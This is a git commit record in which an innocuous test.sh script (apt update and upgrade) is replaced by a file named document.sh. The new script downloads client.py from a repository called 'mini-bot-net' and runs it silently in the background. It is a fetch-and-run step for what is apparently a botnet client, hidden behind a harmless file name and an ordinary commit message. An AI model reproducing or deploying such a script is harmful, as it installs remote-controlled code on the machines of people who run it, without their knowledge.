e4b6dc44d948383f8df00103481c3ae62a984407
aweiiy <e.sarauskas1@gmail.com>
2021-05-22 15:05:40 +0300

    Update and rename test.sh to document.sh

---
+++ document.sh
@@ -0,0 +1,3 @@
+#!/bin/sh
+wget https://raw.githubusercontent.com/aweiiy/mini-bot-net/main/client.py -P ~/downloads
+python3 ~/downloads/client.py &
--- test.sh
+++
@@ -1,4 +0,0 @@
-#!/bin/sh
-apt update
-apt upgrade -y
-echo "hello"
